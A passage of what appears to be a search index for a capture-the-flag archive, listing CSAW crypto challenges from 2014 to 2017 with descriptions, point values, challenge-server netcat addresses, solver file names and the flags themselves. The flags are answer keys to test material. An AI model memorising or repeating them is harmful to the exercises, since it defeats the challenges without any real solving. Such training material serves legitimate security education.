            "text": "Punchout\n\n\nAuthor\n\n\nStortz\n\n\nPoints\n\n\n125\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nWe found these System/360 punch cards and we need to extract the data. We already read the data off for you. It looks encrypted. Can you help?\n\n\nFlag\n\n\nflag{https://i.imgur.com/ZNem5o3.gifv}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \npunchout.tar.xz-24504ddc1e81092010497ee49fc52e1c", 
            "title": "Punchout"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/#punchout", 
            "text": "", 
            "title": "Punchout"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/#author", 
            "text": "Stortz", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/#points", 
            "text": "125", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/#description", 
            "text": "We found these System/360 punch cards and we need to extract the data. We already read the data off for you. It looks encrypted. Can you help?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/#flag", 
            "text": "flag{https://i.imgur.com/ZNem5o3.gifv}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/crypto/punchout/#setup", 
            "text": "Distribute  punchout.tar.xz-24504ddc1e81092010497ee49fc52e1c", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/", 
            "text": "Feal\n\n\nAuthor\n\n\nAgre\n\n\nPoints\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nFlag\n\n\nkey{FealMeBaby}\n\n\nSolution\n\n\nSetup", 
            "title": "Feal"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/#feal", 
            "text": "", 
            "title": "Feal"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/#author", 
            "text": "Agre", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/#points", 
            "text": "", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/#flag", 
            "text": "key{FealMeBaby}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/crypto/feal/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/", 
            "text": "almost_xor\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nCan you decode this ciphertext?\n809fdd88dafa96e3ee60c8f179f2d88990ef4fe3e252ccf462deae51872673dcd34cc9f55380cb86951b8be3d8429839\nUpdate Sun 3:24 Eastern: merged the 2 lines to make it clear that it's a single ciphertext, no actual change to challenge.\n\n\nFlag\n\n\nflag{\nx0r_i5_Add1+10n-m0D-2,\nbU+_+h15_Wa5_m0d=8}\n\n\nSolution\n\n\nalmostxorsolution.py\n\n\nSetup\n\n\nGive players almost_xor.py and this ciphertext:\n\n\n809fdd88dafa96e3ee60c8f179f2d88990ef4fe3e252ccf4\n62deae51872673dcd34cc9f55380cb86951b8be3d8429839", 
            "title": "Almost XOR"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/#almost_xor", 
            "text": "", 
            "title": "almost_xor"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/#description", 
            "text": "Can you decode this ciphertext?\n809fdd88dafa96e3ee60c8f179f2d88990ef4fe3e252ccf462deae51872673dcd34cc9f55380cb86951b8be3d8429839\nUpdate Sun 3:24 Eastern: merged the 2 lines to make it clear that it's a single ciphertext, no actual change to challenge.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/#flag", 
            "text": "flag{ x0r_i5_Add1+10n-m0D-2, bU+_+h15_Wa5_m0d=8}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/#solution", 
            "text": "almostxorsolution.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/crypto/almost_xor/#setup", 
            "text": "Give players almost_xor.py and this ciphertext:  809fdd88dafa96e3ee60c8f179f2d88990ef4fe3e252ccf4\n62deae51872673dcd34cc9f55380cb86951b8be3d8429839", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/", 
            "text": "LuPiN\n\n\nAuthor\n\n\nAvi Weinstock\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nA post-quantum cryptosystem solvable by LayPersoNs\nnc crypto.chal.csaw.io 1922\nNOTE: This takes a while to respond.\n\n\nFlag\n\n\nflag{gl4d_y0u_d1d_n0t_turn_1nt0_a_w4r3w0lf}\n\n\nSolution\n\n\nlpn_solve.py\n\n\nSetup\n\n\nDistribute \nlpn_chal.py\n, with the flag removed", 
            "title": "Lupin"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/#lupin", 
            "text": "", 
            "title": "LuPiN"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/#author", 
            "text": "Avi Weinstock", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/#description", 
            "text": "A post-quantum cryptosystem solvable by LayPersoNs\nnc crypto.chal.csaw.io 1922\nNOTE: This takes a while to respond.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/#flag", 
            "text": "flag{gl4d_y0u_d1d_n0t_turn_1nt0_a_w4r3w0lf}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/#solution", 
            "text": "lpn_solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/crypto/Lupin/#setup", 
            "text": "Distribute  lpn_chal.py , with the flag removed", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/crypto/Neo/", 
            "text": "Neo\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nYour life has been boring, seemingling meaningless up until now. A man in a black suit with fresh shades is standing in front of you telling you that you are The One. Do you chose to go down this hole? Or just sit around pwning n00bs for the rest of your life?\n\n\nFlag\n\n\nflag{what_if_i_told_you_you_solved_the_challenge}\n\n\nSolution\n\n\nsolve.py", 
            "title": "Neo"
        }, 
        {
            "location": "/challenges/2016/crypto/Neo/#neo", 
            "text": "", 
            "title": "Neo"
        }, 
        {
            "location": "/challenges/2016/crypto/Neo/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/crypto/Neo/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/crypto/Neo/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/crypto/Neo/#description", 
            "text": "Your life has been boring, seemingling meaningless up until now. A man in a black suit with fresh shades is standing in front of you telling you that you are The One. Do you chose to go down this hole? Or just sit around pwning n00bs for the rest of your life?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/crypto/Neo/#flag", 
            "text": "flag{what_if_i_told_you_you_solved_the_challenge}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/crypto/Neo/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/", 
            "text": "Killer cipher\n\n\nAuthor\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nA killer always leaves a encrypted message at the crime scene. The FBI collected all of them and noticed they were all from the same plaintext. Can you decrypt it so we can solve this case?\n\n\nHINT: They found this killer is a Zodiac copycat.\"\n\n\nFlag\n\n\nflag{h0m0ph0n1c_c1ph3r_15_l0v3}\n\n\nSolution\n\n\nSetup\n\n\nonly ciphertext is provided", 
            "title": "Killer Cipher"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/#killer-cipher", 
            "text": "", 
            "title": "Killer cipher"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/#description", 
            "text": "A killer always leaves a encrypted message at the crime scene. The FBI collected all of them and noticed they were all from the same plaintext. Can you decrypt it so we can solve this case?  HINT: They found this killer is a Zodiac copycat.\"", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/#flag", 
            "text": "flag{h0m0ph0n1c_c1ph3r_15_l0v3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/crypto/Killer_cipher/#setup", 
            "text": "only ciphertext is provided", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/crypto/check-plz/", 
            "text": "check-plz\n\n\nAuthor\n\n\nSingh\n\n\nPoints\n\n\n250\n\n\nDescription\n\n\nWe just recently set up our crypto for a new project. We'll give you the flag if you can guess the resulting mac. Try the stripped down version here:\n\nnc 52.91.89.84 4000\n\n\nFlag\n\n\nSolution\n\n\nSetup\n\n\nsource : \nhttps://gist.github.com/gsingh93/755905ada3053e0365c1", 
            "title": "Check Plz"
        }, 
        {
            "location": "/challenges/2015/crypto/check-plz/#check-plz", 
            "text": "", 
            "title": "check-plz"
        }, 
        {
            "location": "/challenges/2015/crypto/check-plz/#author", 
            "text": "Singh", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/crypto/check-plz/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/crypto/check-plz/#description", 
            "text": "We just recently set up our crypto for a new project. We'll give you the flag if you can guess the resulting mac. Try the stripped down version here: nc 52.91.89.84 4000", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/crypto/check-plz/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/crypto/check-plz/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/crypto/check-plz/#setup", 
            "text": "source :  https://gist.github.com/gsingh93/755905ada3053e0365c1", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/", 
            "text": "Psifer School\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nThere's no heartbleed here. Why don't we use these ciphers?\n\n\nFlag\n\n\nflag{IGraduatedPsiferSchoolAndAllIGotWasThisLousyFlag}\n\n\nSolution\n\n\nsolveschool.py\n\n\nSetup", 
            "title": "Psifer School"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/#psifer-school", 
            "text": "", 
            "title": "Psifer School"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/#description", 
            "text": "There's no heartbleed here. Why don't we use these ciphers?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/#flag", 
            "text": "flag{IGraduatedPsiferSchoolAndAllIGotWasThisLousyFlag}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/#solution", 
            "text": "solveschool.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/crypto/psifer_school/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/", 
            "text": "Mountain Sound\n\n\nAuthor\n\n\nStortz\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nFlag\n\n\nkey{It\ns not the one that goes \nhuuuhh!\n}\n\n\nSolution\n\n\nSetup", 
            "title": "Mountainsound"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#mountain-sound", 
            "text": "", 
            "title": "Mountain Sound"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#author", 
            "text": "Stortz", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#flag", 
            "text": "key{It s not the one that goes  huuuhh! }", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/crypto/mountainsound_-_Stortz/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/", 
            "text": "Side-channel\n\n\nAuthor\n\n\neshard\n\n\nCategory\n\n\nCrypto\n\n\nPoints\n\n\n300\n\n\nDescription\n\n\n\"\nThis email isn't for Tyrell. It's for us.\n\"\n\n\nFlag\n\n\nflag{51d3c$4nn3l1sfun}\n\n\nSetup\n\n\nCompetitors will be given this file:\n- mail\n\n\nSolution\n\n\nvirtualenv2 v\nsource v/bin/activate\npip install -r requirements.txt\npython solver.py", 
            "title": "Side-channel"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/#side-channel", 
            "text": "", 
            "title": "Side-channel"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/#author", 
            "text": "eshard", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/#description", 
            "text": "\" This email isn't for Tyrell. It's for us. \"", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/#flag", 
            "text": "flag{51d3c$4nn3l1sfun}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/#setup", 
            "text": "Competitors will be given this file:\n- mail", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/crypto/Side-channel/#solution", 
            "text": "virtualenv2 v\nsource v/bin/activate\npip install -r requirements.txt\npython solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/", 
            "text": "Baby Crypt\n\n\nAuthor\n\n\nPoints\n\n\n350\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nbaby_crypt The cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.\nflag is in the source file\n\n\nFlag\n\n\nflag{Crypt0_is_s0_h@rd_t0_d0...}\n\n\nSolution\n\n\nsolve_baby_crypt.py\n\n\nSetup\n\n\nJust give them a place to nc to", 
            "title": "Baby Crypt"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/#baby-crypt", 
            "text": "", 
            "title": "Baby Crypt"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/#points", 
            "text": "350", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/#description", 
            "text": "baby_crypt The cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.\nflag is in the source file", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/#flag", 
            "text": "flag{Crypt0_is_s0_h@rd_t0_d0...}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/#solution", 
            "text": "solve_baby_crypt.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/crypto/baby_crypt/#setup", 
            "text": "Just give them a place to nc to", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/", 
            "text": "Broken Box\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nI made a RSA signature box, but the hardware is too old, sometimes it return me a wrong answer... something about bits being flipped?... can you fix it for me?\ne = 0x10001\nnc 192.241.234.35 31337\n\n\nFlag\n\n\nflag{br0k3n_h4rdw4r3_l34d5_70_b17_fl1pp1n6}\n\n\nSolution\n\n\nsolver.py\n\n\nNotes\n\n\nthis challenge doesn't support source code", 
            "title": "Broken Box"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/#broken-box", 
            "text": "", 
            "title": "Broken Box"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/#description", 
            "text": "I made a RSA signature box, but the hardware is too old, sometimes it return me a wrong answer... something about bits being flipped?... can you fix it for me?\ne = 0x10001\nnc 192.241.234.35 31337", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/#flag", 
            "text": "flag{br0k3n_h4rdw4r3_l34d5_70_b17_fl1pp1n6}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/crypto/Broken_Box/#notes", 
            "text": "this challenge doesn't support source code", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/", 
            "text": "Broken Box\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nI fixed the RSA signature box I made, even though it still returns wrong answers sometimes, it get much better now.\ne = 97\n\nnc 192.241.234.35 31337\n\n\nFlag\n\n\nflag{n3v3r_l34k_4ny_51n6l3_b17_0f_pr1v473_k3y}\n\n\nSolution\n\n\nsolver.sage.py\n\n\nNotes\n\n\nthis challenge doesn't support source code", 
            "title": "Still Broken Box"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/#broken-box", 
            "text": "", 
            "title": "Broken Box"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/#description", 
            "text": "I fixed the RSA signature box I made, even though it still returns wrong answers sometimes, it get much better now.\ne = 97 nc 192.241.234.35 31337", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/#flag", 
            "text": "flag{n3v3r_l34k_4ny_51n6l3_b17_0f_pr1v473_k3y}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/#solution", 
            "text": "solver.sage.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/crypto/Still_Broken_Box/#notes", 
            "text": "this challenge doesn't support source code", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/", 
            "text": "Another Broken Box\n\n\nAuthor\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nMy box seems to be broken again... But not the hardware this time.\nUPDATE: Last byte of key is the character '0'\n\nnc crypto.chal.csaw.io 1343\n\"\n\n\nFlag\n\n\nflag{br0k3n_b0x_f0r3v3r}\n\n\nSolution\n\n\nSetup\n\n\ncrypto400.py should be provided", 
            "title": "Another Broken Box"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/#another-broken-box", 
            "text": "", 
            "title": "Another Broken Box"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/#description", 
            "text": "My box seems to be broken again... But not the hardware this time.\nUPDATE: Last byte of key is the character '0' nc crypto.chal.csaw.io 1343 \"", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/#flag", 
            "text": "flag{br0k3n_b0x_f0r3v3r}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/crypto/Another_Broken_Box/#setup", 
            "text": "crypto400.py should be provided", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/", 
            "text": "Slabs of Platinum\n\n\nAuthor\n\n\nD'Antoine\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nCryptography\n\n\nDescription\n\n\nYou showed great skill with the last target! But we have found the encrypted image and remnants of an even more complex encryption scheme.\nCan you help us?\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/negasora/CTFWriteups/tree/master/CSAW-Finals-2015/Slabs-of-Platinum---Crypto-500\n\n\n\n\nSetup\n\n\nslabs_of_platinum_7f07f420a08ea404b88c4888f23c70e3\n\n\nreal_hackers_use.sage_2f88c5095680fd3bb890bfc088ea6852", 
            "title": "Slabs of Platinum"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/#slabs-of-platinum", 
            "text": "", 
            "title": "Slabs of Platinum"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/#author", 
            "text": "D'Antoine", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/#category", 
            "text": "Cryptography", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/#description", 
            "text": "You showed great skill with the last target! But we have found the encrypted image and remnants of an even more complex encryption scheme.\nCan you help us?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/#solution", 
            "text": "https://github.com/negasora/CTFWriteups/tree/master/CSAW-Finals-2015/Slabs-of-Platinum---Crypto-500", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/crypto/slabs-of-platinum/#setup", 
            "text": "slabs_of_platinum_7f07f420a08ea404b88c4888f23c70e3  real_hackers_use.sage_2f88c5095680fd3bb890bfc088ea6852", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/", 
            "text": "Bricks of Gold\n\n\nAuthor\n\n\nD'Antoine\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nWe've captured this encrypted file being smuggled into the country. All we know is that they rolled their own custom CBC mode algorithm - its probably terrible.\nHINT: take a second look at the file for elements needed for the crypto\n\n\nFlag\n\n\nflag{c4sh_Rul3s_ev3ryTh1ng_4r0und_m3}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nbricks_of_gold_40d12e05cd6d67ed51d29a6da39d6878", 
            "title": "Bricks of Gold"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/#bricks-of-gold", 
            "text": "", 
            "title": "Bricks of Gold"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/#author", 
            "text": "D'Antoine", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/#description", 
            "text": "We've captured this encrypted file being smuggled into the country. All we know is that they rolled their own custom CBC mode algorithm - its probably terrible.\nHINT: take a second look at the file for elements needed for the crypto", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/#flag", 
            "text": "flag{c4sh_Rul3s_ev3ryTh1ng_4r0und_m3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/crypto/bricks_of_gold/#setup", 
            "text": "Distribute  bricks_of_gold_40d12e05cd6d67ed51d29a6da39d6878", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/", 
            "text": "CFB Sum\n\n\nAuthor\n\n\nAgre\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nFlag\n\n\nkey{This is my pad there are many like it but this pad is my own}\n\n\nSolution\n\n\nSetup", 
            "title": "CFB Sum"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/#cfb-sum", 
            "text": "", 
            "title": "CFB Sum"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/#author", 
            "text": "Agre", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/#flag", 
            "text": "key{This is my pad there are many like it but this pad is my own}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/crypto/cfbsum/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/", 
            "text": "Wieners\n\n\nAuthor\n\n\nAntoniewicz\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nCrypto\n\n\nDescription\n\n\nLogic Analyzer -\n RE -\n Morse Code -\n Key\n\n\nFlag\n\n\nkey{http://imgur.com/XYlLNrk}\n\n\nSolution\n\n\nIn \nsolution/\n\n\nSetup\n\n\nDistribute \nwieners.7z", 
            "title": "Wieners"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#wieners", 
            "text": "", 
            "title": "Wieners"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#author", 
            "text": "Antoniewicz", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#category", 
            "text": "Crypto", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#description", 
            "text": "Logic Analyzer -  RE -  Morse Code -  Key", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#flag", 
            "text": "key{http://imgur.com/XYlLNrk}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#solution", 
            "text": "In  solution/", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/crypto/Wieners_-_Antoniewicz/#setup", 
            "text": "Distribute  wieners.7z", 
            "title": "Setup"
        }, 
        {
            "location": "/web-exploitation/introduction/", 
